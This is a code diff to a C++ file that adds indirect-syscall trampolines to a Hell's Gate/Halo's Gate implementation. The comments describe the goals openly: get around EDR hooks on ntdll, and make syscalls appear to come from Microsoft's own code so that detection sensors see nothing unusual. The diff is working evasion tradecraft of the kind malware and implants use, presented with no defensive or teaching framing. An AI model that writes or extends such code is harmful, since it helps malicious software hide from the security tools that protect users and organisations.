@@ -1,7 +1,10 @@
-// syscalls.cpp — Hell's Gate + Halo's Gate
+// syscalls.cpp — Hell's Gate + Halo's Gate, direct and indirect stubs
 // Reads ntdll.dll from disk (not the hooked in-memory copy), parses PE exports,
 // extracts syscall numbers via stub pattern scan, uses Halo's Gate neighbor search
 // for any EDR-hooked stubs, and allocates RX trampoline stubs for each Nt* function.
+// Stubs prefer indirect mode: they jmp into the loaded ntdll's own `syscall; ret`
+// so the instruction lives in Microsoft's code, not in our private allocation, and
+// fall back to executing `syscall` from the pool when no such instruction exists.
 #include "syscalls.hpp"
 #include <windows.h>
 #include <winternl.h>
@@ -227,41 +230,121 @@ static DWORD ResolveSSN(const NtdllMap& m,
 }
 
 // ============================================================
+// Indirect syscalls — locate the `syscall; ret` pair inside the
+// *loaded* ntdll so stubs jump into Microsoft's own instruction
+// instead of executing `syscall` from our private allocation.
+// A sensor that validates where the syscall instruction lives, or
+// that compares the SSN in eax against the stub it is executed
+// from, sees a consistent picture. The scan prefers the target
+// function's own stub: its bytes sit past the entry point, so an
+// entry-point hook still leaves the real syscall instruction.
+// ============================================================
+struct LoadedText {
+    const BYTE* base = nullptr;
+    DWORD       rva  = 0;
+    DWORD       size = 0;
+};
+
+static bool GetLoadedText(LoadedText& out) {
+    HMODULE h = GetNtDllBase();
+    if (!h) return false;
+    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(h);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
+        reinterpret_cast<const BYTE*>(h) + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
+    auto* secs = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
+        if (memcmp(secs[i].Name, ".text", 5) == 0) {
+            out.base = reinterpret_cast<const BYTE*>(h);
+            out.rva  = secs[i].VirtualAddress;
+            out.size = std::max(secs[i].SizeOfRawData, secs[i].Misc.VirtualSize);
+            return true;
+        }
+    }
+    return false;
+}
+
+static const BYTE* ScanSyscall(const BYTE* p, size_t limit) {
+    for (size_t i = 0; i + 2 < limit; ++i) {
+        if (p[i] == 0x0F && p[i + 1] == 0x05 && p[i + 2] == 0xC3)
+            return p + i;
+    }
+    return nullptr;
+}
+
+static DWORD ExportRva(const std::vector<ExportSlot>& exports, const std::string& name) {
+    for (const auto& e : exports) {
+        if (e.name == name) return e.rva;
+    }
+    return 0;
+}
+
+// nullptr → caller keeps the direct-syscall stub. Never fails the resolve.
+static const BYTE* FindSyscallInstruction(DWORD funcRva) {
+    LoadedText t;
+    if (!GetLoadedText(t)) return nullptr;
+
+    if (funcRva >= t.rva && funcRva < t.rva + t.size) {
+        size_t avail = std::min<size_t>(32, t.rva + t.size - funcRva);
+        const BYTE* hit = ScanSyscall(t.base + funcRva, avail);
+        if (hit) return hit;
+    }
+    // Fallback: any clean syscall;ret in ntdll's .text
+    return ScanSyscall(t.base + t.rva, t.size);
+}
+
+// ============================================================
 // Build RX trampoline pool for all required syscalls:
+//
+//   direct stub                      indirect stub
+//     4C 8B D1  mov r10, rcx           4C 8B D1  mov r10, rcx
+//     B8 <ssn>  mov eax, ssn           B8 <ssn>  mov eax, ssn
+//     0F 05     syscall                49 BB <addr64>  mov r11, <syscall;ret in ntdll>
+//     C3        ret                    41 FF E3        jmp r11
+//
+// r11 is caller-saved scratch under the x64 ABI, so no syscall
+// argument register is clobbered, and because the trampoline
+// jumps rather than calls, the `ret` inside ntdll returns
+// straight to the original caller.
 // ============================================================
 static PVOID  g_TrampolinePool  = nullptr;
 static size_t g_TrampolineCount = 0;
-constexpr size_t MAX_STUBS = 16; // pool capacity; 11 entries resolved today
-constexpr size_t STUB_LEN  = 11;
+constexpr size_t MAX_STUBS = 16;  // pool capacity; 11 entries resolved today
+constexpr size_t STUB_SLOT = 32;  // aligned slot; longest stub is 21 bytes
 
-static PVOID BuildTrampoline(DWORD ssn) {
-    static const BYTE TEMPLATE[STUB_LEN] = {
-        0x4C, 0x8B, 0xD1,              // mov r10, rcx
-        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <ssn>
-        0x0F, 0x05,                    // syscall
-        0xC3                           // ret
-    };
-
+static PVOID BuildTrampoline(DWORD ssn, const BYTE* syscallInsn) {
     if (!g_TrampolinePool) {
-        g_TrampolinePool = VirtualAlloc(nullptr, STUB_LEN * MAX_STUBS,
+        g_TrampolinePool = VirtualAlloc(nullptr, STUB_SLOT * MAX_STUBS,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
         if (!g_TrampolinePool) return nullptr;
     }
     if (g_TrampolineCount >= MAX_STUBS) return nullptr;
 
-    PVOID stubAddr = reinterpret_cast<BYTE*>(g_TrampolinePool) + (g_TrampolineCount * STUB_LEN);
-    BYTE stub[STUB_LEN];
-    memcpy(stub, TEMPLATE, STUB_LEN);
-    *reinterpret_cast<DWORD*>(&stub[4]) = ssn;
-    memcpy(stubAddr, stub, STUB_LEN);
+    BYTE stub[STUB_SLOT] = {};
+    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;    // mov r10, rcx
+    stub[3] = 0xB8;                                    // mov eax, <ssn>
+    memcpy(&stub[4], &ssn, sizeof(ssn));
+
+    if (syscallInsn) {
+        uint64_t addr = reinterpret_cast<uint64_t>(syscallInsn);
+        stub[8] = 0x49; stub[9] = 0xBB;                // mov r11, <addr64>
+        memcpy(&stub[10], &addr, sizeof(addr));
+        stub[18] = 0x41; stub[19] = 0xFF; stub[20] = 0xE3; // jmp r11
+    } else {
+        stub[8] = 0x0F; stub[9] = 0x05; stub[10] = 0xC3;   // syscall; ret
+    }
+
+    PVOID stubAddr = reinterpret_cast<BYTE*>(g_TrampolinePool) + (g_TrampolineCount * STUB_SLOT);
+    memcpy(stubAddr, stub, sizeof(stub));
     g_TrampolineCount++;
     return stubAddr;
 }
 
 static VOID FinalizeTrampolinePool() {
     if (!g_TrampolinePool || g_TrampolineCount == 0) return;
-    size_t totalBytes = STUB_LEN * g_TrampolineCount;
+    size_t totalBytes = STUB_SLOT * g_TrampolineCount;
     DWORD oldProt = 0;
     VirtualProtect(g_TrampolinePool, totalBytes, PAGE_EXECUTE_READ, &oldProt);
     FlushInstructionCache(GetCurrentProcess(), g_TrampolinePool, totalBytes);
@@ -325,7 +408,9 @@ BOOL InitializeSyscalls() {
     do {                                                         \
         DWORD _ssn = ResolveSSN(m, exports, sym);               \
         if (_ssn != DWORD(-1)) {                                 \
-            PVOID _t = BuildTrampoline(_ssn);                    \
+            const BYTE* _insn =                                  \
+                FindSyscallInstruction(ExportRva(exports, sym)); \
+            PVOID _t = BuildTrampoline(_ssn, _insn);             \
             if (_t)                                              \
                 g_Syscalls.field =                               \
                     reinterpret_cast<decltype(g_Syscalls.field)>(_t); \
